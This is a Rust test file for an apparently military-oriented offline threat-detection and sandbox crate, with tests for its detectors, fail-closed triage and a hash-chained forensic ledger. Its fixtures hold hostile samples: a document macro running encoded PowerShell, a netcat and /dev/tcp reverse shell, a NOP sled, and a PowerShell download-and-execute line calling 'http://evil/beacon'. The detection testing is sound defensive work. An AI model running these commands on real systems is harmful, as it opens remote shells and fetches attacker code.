use ai_infinity_force_one_vault::detection::{
    C2Detector, ExecutableInspector, MaliciousDocScanner, OfflineThreatEngine, PhishingDetector,
    TriageOutcome,
};
use ai_infinity_force_one_vault::ingest::IngestRecord;
use ai_infinity_force_one_vault::sandbox::ddil::DdilDetonationCoordinator;
use ai_infinity_force_one_vault::sandbox::LaneId;
use ai_infinity_force_one_vault::vault::forensics::{ForensicLedger, IncidentReport};

#[test]
fn test_offline_detection_malicious_macro_and_shell() {
    let macro_doc = b"Subject: Urgent Order\r\nSub Document_Open()\r\nSet w = CreateObject(\"WScript.Shell\")\r\nw.Run(\"powershell.exe -enc AAAA\")\r\nEnd Sub";
    let indicators = MaliciousDocScanner::scan(macro_doc);
    assert!(
        !indicators.is_empty(),
        "Should detect malicious document macro patterns"
    );
    assert!(indicators.iter().any(|i| i.pattern == "Document_Open"));
    assert!(indicators.iter().any(|i| i.pattern == "WScript.Shell"));
    assert!(indicators.iter().any(|i| i.pattern == "powershell"));
}

#[test]
fn test_offline_detection_phishing_lures() {
    let email_lure = "URGENT: Submit your cac pin and verify your account at http://192.168.1.10/login immediately.";
    let findings = PhishingDetector::scan(email_lure);
    assert!(
        !findings.is_empty(),
        "Should detect tactical phishing lures"
    );
    for f in &findings {
        println!("FINDING: {:?}", f);
    }
    assert!(findings
        .iter()
        .any(|f| f.description.contains("Common Access Card")));
    assert!(findings.iter().any(|f| f.pattern_type == "Direct IP Link"));
}

#[test]
fn test_offline_detection_c2_and_reverse_shell() {
    let script_payload = b"#!/bin/bash\nnc -e /bin/sh 10.0.0.1 4444\n/dev/tcp/10.0.0.1/8080";
    let indicators = C2Detector::scan(script_payload);
    assert!(
        !indicators.is_empty(),
        "Should detect C2 reverse shell signatures"
    );
    assert!(indicators
        .iter()
        .any(|i| i.description.contains("reverse shell")));
}

#[test]
fn test_offline_detection_pe_and_nop_sled() {
    let mut shellcode = vec![0x90; 32];
    shellcode.extend_from_slice(b"\xcc\xc3");
    let findings = ExecutableInspector::inspect(&shellcode);
    assert!(findings
        .iter()
        .any(|f| f.classification == "Shellcode NOP Sled"));
}

#[test]
fn test_three_outcome_fail_closed_triage() {
    let engine = OfflineThreatEngine::default();

    // 1. Clean payload
    let clean_res = engine.scan_payload(b"Normal diagnostic telemetry packet 12345");
    assert_eq!(clean_res.triage.outcome, TriageOutcome::Clean);
    assert!(clean_res.triage.outcome.is_executable_on_host());

    // 2. Quarantine payload (suspicious lure, elevated non-critical risk < 60)
    let quarantine_res = engine.scan_payload(b"Notice: please verify your account info");
    assert_eq!(quarantine_res.triage.outcome, TriageOutcome::Quarantine);
    assert!(!quarantine_res.triage.outcome.is_executable_on_host());
    assert!(!quarantine_res.triage.outcome.is_sealed());

    // 3. Sealed payload (C2 / weaponized exploit)
    let sealed_res = engine.scan_payload(
        b"powershell IEX(New-Object Net.WebClient).DownloadString('http://evil/beacon')",
    );
    assert_eq!(sealed_res.triage.outcome, TriageOutcome::Sealed);
    assert!(sealed_res.triage.outcome.is_sealed());
    assert!(sealed_res.triage.requires_jag_s2_escalation);
}

#[test]
fn test_12_lane_ddil_concurrent_detonation() {
    let coordinator = DdilDetonationCoordinator::default();

    let mut records = Vec::new();
    for i in 0..12 {
        let payload = if i % 2 == 0 {
            b"Normal radar calibration data".to_vec()
        } else {
            b"Malicious payload: AutoOpen WScript.Shell".to_vec()
        };
        records.push(IngestRecord::new(&format!("rec-{}", i), payload));
    }

    let results = coordinator.detonate_batch_12_lanes(records);
    assert_eq!(results.len(), 12);
    for (idx, res) in results.iter().enumerate() {
        assert_eq!(res.lane_id, LaneId::from_index(idx).unwrap().code());
        if idx % 2 == 0 {
            assert!(res.execution_passed);
            assert_eq!(res.triage, TriageOutcome::Clean);
        } else {
            // Weaponized macros reach threat score >= 60 and are sealed fail-closed
            assert_eq!(res.triage, TriageOutcome::Sealed);
            assert!(!res.execution_passed);
        }
    }
}

#[test]
fn test_forensic_chain_of_custody_and_jag_audit() {
    let ledger = ForensicLedger::new();

    let rec1 = ledger.record_incident(IncidentReport {
        incident_id: "INC-001",
        lane_code: "MACK-06",
        payload_bytes: b"malicious packet 1",
        triage_outcome: TriageOutcome::Quarantine,
        threat_score: 45,
        detected_indicators: vec!["Elevated entropy".into()],
        operator_id: "14E-OPERATOR-7721",
    });
    assert_eq!(rec1.prev_record_hash, ForensicLedger::GENESIS_HASH);

    let rec2 = ledger.record_incident(IncidentReport {
        incident_id: "INC-002",
        lane_code: "MACK-12",
        payload_bytes: b"weaponized C2 stager",
        triage_outcome: TriageOutcome::Sealed,
        threat_score: 95,
        detected_indicators: vec!["Meterpreter C2 endpoint".into()],
        operator_id: "S2-CYBER-OFFICER-09",
    });
    assert_eq!(rec2.prev_record_hash, rec1.record_hash);

    assert!(
        ledger.verify_chain(),
        "Cryptographic forensic chain must verify"
    );
    assert_eq!(ledger.incident_count(), 2);
}
